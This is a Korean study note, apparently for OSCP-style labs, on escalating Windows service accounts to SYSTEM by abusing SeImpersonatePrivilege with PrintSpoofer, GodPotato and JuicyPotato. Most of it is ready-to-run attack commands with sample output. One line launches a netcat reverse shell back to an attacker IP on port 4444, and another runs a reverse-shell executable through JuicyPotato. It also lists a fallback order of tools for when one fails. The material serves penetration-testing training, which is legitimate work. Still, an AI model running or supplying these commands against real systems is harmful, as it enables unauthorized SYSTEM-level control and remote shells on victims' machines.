# SeImpersonatePrivilege — 실습

- 뜻: 가장(Impersonation)
- 핵심: 서비스 계정(Network Service, Local Service, IIS AppPool, MSSQL)으로 들어왔을 때 SYSTEM으로 올라가는 열쇠. Potato 계열의 원리

## 1. 특권 상태 확인

```powershell
whoami /priv | findstr /i "SeImpersonate"
```

```text
SeImpersonatePrivilege        Impersonate a client after authentication Enabled
```

### 현재 계정 확인

- `network service` 등이면 공격 대상

```powershell
whoami
```

```text
nt authority\network service
```

## 2. 원리 이해 (3줄)

- 서버(서비스)가 접속한 클라이언트의 토큰을 빌려쓸 수 있다
- 공격자가 가짜 클라이언트가 되어 SYSTEM 토큰을 발급받도록 유도한다
- 그 토큰으로 프로세스를 실행하면 SYSTEM 쉘이 된다

## 3. 실습: PrintSpoofer (구 서버, 2012~2019)

```powershell
C:\temp\PrintSpoofer64.exe -i -c "whoami"
```

```text
[+] Found privilege: SeImpersonatePrivilege
[+] CreateProcessAsUser() OK
nt authority\system
```

- 성공 기준: `nt authority\system`

### 실전 리버스쉘 (KALI_IP는 본인 IP로 교체)

```powershell
C:\temp\PrintSpoofer64.exe -i -c "C:\temp\nc.exe 192.168.x.x 4444 -e cmd"
```

## 4. 실습: GodPotato / SweetPotato (신 서버, 2012~2022)

- .NET 4 필요, PrintSpoofer 막힌 환경용

```powershell
C:\temp\GodPotato-NET4.exe -cmd "cmd /c whoami"
```

```text
[*] CreateProcessAsUser() OK
nt authority\system
```

- Named Pipe 기반이라 방화벽/포트 영향이 적다

## 5. 실습: JuicyPotato (구 서버, CLSID 필요)

### CLSID 선택

- CLSID 목록에서 OS 버전에 맞는 것 선택

```powershell
C:\temp\JuicyPotato.exe -l 1337 -p C:\temp\rev.exe -t * -c "{CLSID}"
```

- 리스닝 포트(`-l`)와 실행 파일(`-p`) 지정이 핵심

## 6. 이해 포인트

- OSCP/PG에서 가장 자주 나온다
- 실패하면 OS 버전/빌드에 맞는 도구로 교체 (PrintSpoofer → GodPotato → SweetPotato 순)
- Disabled여도 목록에만 보이면 시도한다
